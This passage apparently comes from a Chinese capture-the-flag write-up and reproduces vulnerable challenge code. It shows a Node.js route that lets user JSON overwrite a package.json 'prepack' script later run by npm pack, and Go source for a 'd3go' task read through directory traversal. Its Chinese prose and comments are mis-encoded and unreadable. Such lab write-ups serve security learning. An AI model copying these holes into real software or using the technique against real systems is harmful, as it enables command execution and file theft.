<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line">        <span class="comment">//åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡&#123;&#125;,ç”¨äºæ¥æ”¶dataå¯¹è±¡çš„å±æ€§è¯¥æ–¹æ³•å°†ä¼šæŠŠ data å¯¹è±¡ä¸­çš„å±æ€§å¤åˆ¶åˆ° exampleJson å¯¹è±¡ä¸­,å¦‚æœ exampleJson å¯¹è±¡ä¸­å·²ç»å­˜åœ¨ç›¸åŒçš„å±æ€§,åˆ™ä¼šç”¨ data å¯¹è±¡ä¸­çš„å¯¹åº”å€¼è¦†ç›–ç›®æ ‡å¯¹è±¡ä¸­çš„å€¼,æœ€åè¿”å›çš„æ˜¯ä¿®æ”¹åçš„ exampleJson å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;<span class="comment">//npm packæ‰“åŒ…</span></span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®æ¶æ„<code>prepack</code>å¯ä»¥åœ¨<code>npm pack </code>æ‰“åŒ…å‰æ‰§è¡Œ</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230505115657776.png" alt="image-20230505115657776"></p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230505120328845.png" alt="image-20230505120328845"></p>
<p>è®¿é—®é¡µé¢æ‰§è¡Œ<code>npm pack</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.196.153.118:31878/dashboardIndex/PackDependencies</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸ</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230505121040313.png" alt="image-20230505121040313"></p>
<h1 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h1><h2 id="æ ¹æ®ç›®å½•ç©¿è¶Šè·å–æºç "><a href="#æ ¹æ®ç›®å½•ç©¿è¶Šè·å–æºç " class="headerlink" title="æ ¹æ®ç›®å½•ç©¿è¶Šè·å–æºç "></a>æ ¹æ®ç›®å½•ç©¿è¶Šè·å–æºç </h2><p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/config&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/db&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">	log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	InitRouter(r)</span><br><span class="line">	server := http.Server&#123;</span><br><span class="line">		Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">		Handler: r,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	&lt;-state.GracefulShutdown</span><br><span class="line">	<span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	config.Init()</span><br><span class="line">	db.Init()</span><br><span class="line">	<span class="keyword">if</span> config.Conf.AutoUpdate &#123; <span class="comment">//å¦‚æœè®¾ç½®äº†çƒ­æ›´æ–°</span></span><br><span class="line">		log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">		err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">			Program: prog,</span><br><span class="line">			Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">			Fetcher: &amp;config.Fetch,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalln(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		r := gin.Default()</span><br><span class="line">		InitRouter(r)</span><br><span class="line">		<span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">	rand.Read(rad[:])</span><br><span class="line">	store := cookie.NewStore(rad[:])</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">	r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">	r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">	r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">	r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">	admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">	admin.Use(middleware.Auth())</span><br><span class="line">	admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123; <span class="comment">//c è¯·æ±‚ä¿¡æ¯.URL,å‚æ•°,å¤´éƒ¨</span></span><br><span class="line">	<span class="comment">// unzipped file server</span></span><br><span class="line">	p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123; <span class="comment">//å¦‚æœä»¥/unzippedå¼€å¤´,</span></span><br><span class="line">			p = <span class="string">&quot;/&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			p = p[<span class="number">9</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">		c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>)) <span class="comment">//å¼€å¯/unzippedç›®å½•æ¥å£è¯»å–å…¶ä¸­çš„pæ–‡ä»¶</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// embed static file server</span></span><br><span class="line">	p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>) <span class="comment">//å¦‚æœæ²¡æœ‰ä»¥/unzippedå¼€å¤´,å½“ä½œé™æ€æ–‡ä»¶è¯»å–</span></span><br><span class="line">	c.FileFromFS(p, http.FS(Static))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>config.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">	log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">	NoAdminLogin <span class="type">bool</span></span><br><span class="line">	DBUser       <span class="type">string</span></span><br><span class="line">	DBPasswd     <span class="type">string</span></span><br><span class="line">	DBHost       <span class="type">string</span></span><br><span class="line">	DBPort       <span class="type">string</span></span><br><span class="line">	AutoUpdate   <span class="type">bool</span></span><br><span class="line">	UpdateUrl    <span class="type">string</span></span><br><span class="line">	UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	viper.SetConfigName(<span class="string">&quot;config&quot;</span>) <span class="comment">//çœ‹åˆ°é…ç½®æ–‡ä»¶config.yaml</span></span><br><span class="line">	viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">	viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line">	UpdateConfig()</span><br><span class="line">	viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">		UpdateConfig()</span><br><span class="line">	&#125;)</span><br><span class="line">	viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">	Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">	Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">	Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">	Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">	Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)  <span class="comment">//</span></span><br><span class="line">	Fetch = fetcher.HTTP&#123;</span><br><span class="line">		URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">		Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line">	Fetch.Init()</span><br><span class="line">	log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>controller.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line">	<span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">	StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">	StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">	Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	u := &amp;model.User&#123;&#125;</span><br><span class="line">	err := c.ShouldBindJSON(u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  ErrFormatError,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	permission, err := auth.Login(u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  ErrInternalServer,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	session := sessions.Default(c)</span><br><span class="line">	<span class="keyword">switch</span> permission &#123;</span><br><span class="line">	<span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	<span class="keyword">case</span> auth.User:</span><br><span class="line">		session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">		session.Save()</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">0</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	<span class="keyword">case</span> auth.Admin:</span><br><span class="line">		session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">		session.Save()</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">0</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> u model.User</span><br><span class="line">	err := c.ShouldBindJSON(&amp;u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, 